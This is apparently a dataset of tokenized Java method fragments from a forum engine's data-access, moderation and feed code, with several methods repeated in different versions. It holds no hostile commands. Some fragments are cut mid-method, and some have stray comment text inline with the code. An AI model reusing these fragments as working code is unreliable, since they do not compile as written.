public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; int commentId2 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertFalse ( commentDao . isHaveAnswers ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . isHaveAnswers ( commentId1 ) ) ; } 
public CommentDao commentDao ( ) { return new CommentDaoImpl ( ) ; } 
public DeleteInfoDao deleteInfoDao ( ) { return new DeleteInfoDao ( ) ; } 
public void voteGetCurrentPollTest ( ) throws Exception { int currentPollId = pollDao . getCurrentPollId ( ) ; Poll poll = pollDao . getCurrentPoll ( ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public PollDao pollDao ( ) { return new PollDao ( ) ; } 
void removeVariant ( PollVariant variant ) { jdbcTemplate . update ( deleteVariant , variant . getId ( ) ) ; } 
private void updateMultiselect ( Poll poll , boolean multiselect ) { jdbcTemplate . update ( updateMultiselect , multiselect , poll . getId ( ) ) ; } 
private int allocateMsgid ( ) { return jdbcTemplate . queryForObject ( " select nextval('s_msgid') as msgid " , Integer . class ) ; } 
public static boolean equalStrings ( String s1 , String s2 ) { if ( Strings . isNullOrEmpty ( s1 ) ) { return Strings . isNullOrEmpty ( s2 ) ; } return s1 . equals ( s2 ) ; } 
public void commit ( Topic msg , User commiter ) { jdbcTemplate . update ( " UPDATE topics SET moderate='t', commitby=?, commitdate='now' WHERE id=? " , 
public void changeGroup ( Topic msg , int changeGroupId ) { jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , changeGroupId , msg . getId ( ) ) ; } 
public LastMiniNews mapRow ( ResultSet rs , int i ) throws SQLException { LastMiniNews result = new LastMiniNews ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) , rs . getTimestamp ( " lastmod " ) , rs . getString ( " title " ) , rs . getInt ( " c " ) ) ; return result ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false , true isMainPage )); if (tmpl.isModeratorSession() || tmpl.isCorrectorSession()) { int uncommited = jdbcTemplate.queryForInt("select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval)"); mv.getModel().put("uncommited", uncommited); int uncommitedNews = 0; if (uncommited > 0) { uncommitedNews = jdbcTemplate.queryForInt("select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval)"); } mv.getModel().put("uncommitedNews", uncommitedNews); } mv.getModel().put("showAdsense", !tmpl.isSessionAuthorized() || !tmpl.getProf().isHideAdsense()); return mv; } 
public LastMiniNews mapRow ( ResultSet rs , int i ) throws SQLException { final int answers = rs . getInt ( " c " ) ; final int answers0 = ( answers = = 0 ) ? 1 : answers ; final int tmp = answers0 / perPage ; final int pages = ( answers0 % perPage > 0 ) ? tmp + 1 : tmp ; LastMiniNews result = new LastMiniNews ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) , rs . getTimestamp ( " lastmod " ) , rs . getString ( " title " ) , answers , pages ) ; return result ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { return prepareMessagesForUser ( messages , secure , user , profile , loadUserpics , false ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics , boolean mainPage ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > tags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { if ( mainPage & & profile . isMiniNewsBoxletOnMainPage ( ) & & message . isMinor ( ) ) { continue ; } PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public boolean isMiniNewsBoxletOnMainPage ( ) { return boxes . contains ( " lastMiniNews " ) ; } 
private List < Topic > filterMiniNews ( List < Topic > messages ) { ImmutableList . Builder < Topic > filtred = new ImmutableList . Builder < Topic > ( ) ; for ( Topic message : messages ) { if ( message . isMinor ( ) ) { continue ; } filtred . add ( message ) ; } return filtred . build ( ) ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = tmpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , profile , false ) ) ; if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! tmpl . isSessionAuthorized ( ) | | ! tmpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > tags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public boolean isMiniNewsBoxletOnMainPage ( ) { return getBoxlets ( ) . contains ( " lastMiniNews " ) ; } 
public void test1 ( ) { User maxcom = userDao . getUser ( 1 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( maxcom ) > 0 ) ; User anonymous = userDao . getUser ( 2 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( anonymous ) = = 0 ) ; 
public MemoriesDao memoriesDao ( ) { return new MemoriesDao ( ) ; } 
private boolean checkMemoriesPresent ( User user , boolean watch ) { List < Integer > present = jdbcTemplate . queryForList ( " select id from memories where userid=? and watch=? limit 1 " , Integer . class , user . getId ( ) , watch ) ; if ( present = = null | | present . size ( ) = = 0 ) { return false ; 
public boolean isWatchPresetForUser ( User user ) { return checkMemoriesPresent ( user , true ) ; } 
public boolean isFavPresetForUser ( User user ) { return checkMemoriesPresent ( user , false ) ; } 
public void test1 ( ) { User maxcom = userDao . getUser ( 1 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( maxcom ) > 0 ) ; assertTrue ( memoriesDao . isWatchPresetForUser ( maxcom ) ) ; User anonymous = userDao . getUser ( 2 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( anonymous ) = = 0 ) ; assertFalse ( memoriesDao . isFavPresetForUser ( anonymous ) ) ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > topicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , true ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , true ) ; } return new TopicMenu ( topicEditable , 
public boolean isHaveAnswers ( @Nonnull Comment comment ) { return commentDao . getReplaysCount ( comment . getId ( ) ) > 0 ; } 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; int commentId2 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertEquals ( 0 , commentDao . getReplaysCount ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . getReplaysCount ( commentId1 ) > 0 ) ; } 
public boolean delete ( int msgid ) { return jdbcTemplate . update ( " UPDATE topics SET deleted='t',sticky='f' WHERE id=? AND NOT deleted " , msgid ) > 0 ; } 
private boolean deleteTopic ( int mid , User moderator , String reason , int bonus ) { boolean deleted = topicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( mid ) ; } return deleted ; } 
public List < Integer > deleteByIPAddress ( String ip , Timestamp startTime , User moderator , String reason ) { List < Integer > topicIds = topicDao . getAllByIPForUpdate ( ip , startTime ) ; for ( int msgid : topicIds ) { deleteTopic ( msgid , moderator , reason , 0 ) ; } return topicIds ; } 
public List < Integer > deleteReplys ( CommentNode node , User user , boolean score ) { return doDeleteReplys ( node , user , score , 0 ) ; } 
public List < CommentNode > childs ( ) { return Collections . unmodifiableList ( childs ) ; } 
public List < Integer > deleteWithReplys ( Topic topic , int msgid , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( topic , false ) ; CommentNode node = commentList . getNode ( msgid ) ; List < Integer > deleted = commentDao . deleteReplys ( node , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public CommentDao commentDao ( ) { return new CommentDao ( ) ; } 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . block ( user , moderator , reason ) ; List < Integer > deletedTopicIds = topicService . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = deleteAllCommentsByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public List < Integer > deleteWithReplys ( Topic topic , int msgid , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( topic , false ) ; CommentNode node = commentList . getNode ( msgid ) ; List < CommentDao . CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = commentDao . deleteReplys ( replys , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { boolean del = doDeleteComment ( comment . getId ( ) , reason , user , scoreBonus ) ; if ( del & & scoreBonus ! = 0 ) { TODO move to CommentService & use UserDao to modify score jdbcTemplate.update("UPDATE users SET score=score+? WHERE id=?", scoreBonus, comment.getUserid()); } return del; } 
public boolean deleteComment ( int msgid , String reason , User user ) { return doDeleteComment ( msgid , reason , user , 0 ) ; } 
public void updateStatsAfterDelete ( int commentId , int count ) { int topicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , topicId ) ; int groupId = jdbcTemplate . queryForObject ( " SELECT groupid FROM topics WHERE id = ? " , Integer . class , topicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-? WHERE id = ? " , count , groupId ) ; } 
public List < Integer > deleteWithReplys ( Topic topic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( topic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentDao . CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = commentDao . deleteReplys ( replys , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( comment , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( comment . getId ( ) ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( comment . getId ( ) , deleted . size ( ) ) ; } return deleted ; } 
public boolean deleteComment ( int msgid , String reason , User user ) { return deleteComment ( msgid , reason , user , 0 ) ; } 
public List < Integer > deleteWithReplys ( Topic topic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( topic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = deleteReplys ( replys , user , scoreBonus > 2 ) ; boolean deletedMain = deleteComment ( comment , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( comment . getId ( ) ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( comment . getId ( ) , deleted . size ( ) ) ; } return deleted ; } 
private boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { boolean del = commentDao . deleteComment ( comment . getId ( ) , reason , user , scoreBonus ) ; if ( del & & scoreBonus ! = 0 ) { userDao . changeScore ( comment . getUserid ( ) , scoreBonus ) ; } return del ; } 
private boolean doDeleteComment ( int msgid , String reason , User user ) { boolean deleted = commentDao . deleteComment ( msgid , reason , user ) ; if ( deleted ) { deleteInfoDao . insert ( msgid , user , reason , 0 ) ; } return deleted ; } 
private boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { boolean del = commentDao . deleteComment ( comment . getId ( ) , reason , user ) ; if ( del ) { deleteInfoDao . insert ( comment . getId ( ) , user , reason , scoreBonus ) ; } if ( del & & scoreBonus ! = 0 ) { userDao . changeScore ( comment . getUserid ( ) , scoreBonus ) ; } return del ; } 
private boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { Preconditions . checkArgument ( scoreBonus < = 0 , " Score bonus on delete must be non-positive " ) ; boolean del = commentDao . deleteComment ( comment . getId ( ) , reason , user ) ; if ( del & & scoreBonus ! = 0 ) { userDao . changeScore ( comment . getUserid ( ) , scoreBonus ) ; } return del ; } 
public List < Integer > deleteWithReplys ( Topic topic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( topic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; return deleteReplys ( comment , reason , replys , user , - scoreBonus ) ; } 
private List < Integer > deleteReplys ( Comment root , String rootReason , List < CommentAndDepth > replys , User user , int rootBonus ) { boolean score = rootBonus < - 2 ; List < Integer > deleted = new ArrayList < > ( replys . size ( ) ) ; List < DeleteInfoDao . InsertDeleteInfo > deleteInfos = new ArrayList < > ( replys . size ( ) ) ; for ( CommentAndDepth cur : replys ) { Comment child = cur . getComment ( ) ; DeleteInfoDao . InsertDeleteInfo info = cur . deleteInfo ( score , user ) ; boolean del = deleteComment ( child , info . getReason ( ) , user , info . getBonus ( ) ) ; if ( del ) { deleteInfos . add ( info ) ; deleted . add ( child . getId ( ) ) ; } } boolean deletedMain = deleteComment ( root , rootReason , user , rootBonus ) ; if ( deletedMain ) { deleteInfos . add ( new DeleteInfoDao . InsertDeleteInfo ( root . getId ( ) , rootReason , rootBonus , user . getId ( ) ) ) ; deleted . add ( root . getId ( ) ) ; } deleteInfoDao . insert ( deleteInfos ) ; if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( root . getId ( ) , deleted . size ( ) ) ; } return deleted ; } 
public void insert ( int msgid , User deleter , String reason , int scoreBonus ) { Preconditions . checkArgument ( scoreBonus < = 0 , " Score bonus on delete must be non-positive " ) ; jdbcTemplate . update ( INSERT_DELETE_INFO , msgid , deleter . getId ( ) , reason , scoreBonus ) ; } 
public void insert ( final List < InsertDeleteInfo > deleteInfos ) { if ( deleteInfos . isEmpty ( ) ) { return ; } jdbcTemplate . batchUpdate ( INSERT_DELETE_INFO , new BatchPreparedStatementSetter ( ) { @Override 
public void setValues ( PreparedStatement ps , int i ) throws SQLException { InsertDeleteInfo info = deleteInfos . get ( i ) ; ps . setInt ( 1 , info . getMsgid ( ) ) ; ps . setInt ( 2 , info . getDeleteUser ( ) ) ; ps . setString ( 3 , info . getReason ( ) ) ; ps . setInt ( 4 , info . getBonus ( ) ) ; } 
public Group getGroup ( Section section , String name ) throws GroupNotFoundException { try { int id = jdbcTemplate . queryForObject ( 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template tmpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = tmpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , profile , false ) ) ; if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForObject ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " , Integer . class ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForObject ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " , Integer . class ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! tmpl . isSessionAuthorized ( ) | | ! tmpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template tmpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = tmpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , profile , false ) ) ; if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = topicDao . getUncommitedCount ( ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = topicDao . getUncommitedCount ( Section . SECTION_NEWS ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! tmpl . isSessionAuthorized ( ) | | ! tmpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public Poll getPollByTopicId ( int topicId ) throws PollNotFoundException { try { return getPoll ( jdbcTemplate . queryForObject ( queryPoolIdByTopicId , Integer . class , topicId ) ) ; 
public int getEventsCount ( HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } response . setHeader ( " Cache-control " , " no-cache " ) ; return tmpl . getCurrentUser ( ) . getUnreadEvents ( ) ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String town , String info ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , town ) ; if ( info ! = null ) { setUserInfo ( userid , info ) ; } return userid ; } 
public boolean isUserExists ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) as c FROM users WHERE nick=? " , Integer . class , nick ) ; return c > 0 ; } 
public int countFavs ( int tagId ) { return jdbcTemplate . queryForObject ( " SELECT count(*) FROM user_tags WHERE tag_id=:tagId AND is_favorite " , 
public MessageText mapRow ( ResultSet resultSet , int i ) throws SQLException { String text = resultSet . getString ( " message " ) ; String markup = resultSet . getString ( " markup " ) ; boolean lorcode = ! " PLAIN " . equals ( markup ) ; return new MessageText ( text , lorcode ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { String text = resultSet . getString ( " message " ) ; String markup = resultSet . getString ( " markup " ) ; boolean lorcode = ! " PLAIN " . equals ( markup ) ; out . put ( resultSet . getInt ( " id " ) , new MessageText ( text , lorcode ) ) ; } 
public int saveNewMessage ( final Topic msg , final User user , String text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message) values (?,?)", msgid, text ); return msgid; } 
private void addComment ( int commentId , Integer replyToId , String title , String body ) { jdbcTemplate . update ( " INSERT INTO comments (id, userid, title, postdate, replyto, deleted, topic, postip, ua_id) " + " VALUES (?, ?, ?, CURRENT_TIMESTAMP, ?, 'f', ?, ?::inet, create_user_agent(?)) " , commentId , 1 , title , replyToId , topicId , " 127.0.0.1 " , " Integration test User Agent " ) ; jdbcTemplate . update ( " INSERT INTO msgbase (id, message) VALUES (?, ?) " , 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { topicListDto . getSections ( ) . add ( section . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; topicListDto . setFromDate ( fromDate ) ; return topicListDao . getTopics ( topicListDto ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( 20 ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( topicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( tech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? topicListDao . getTopics ( topicListDto ) 
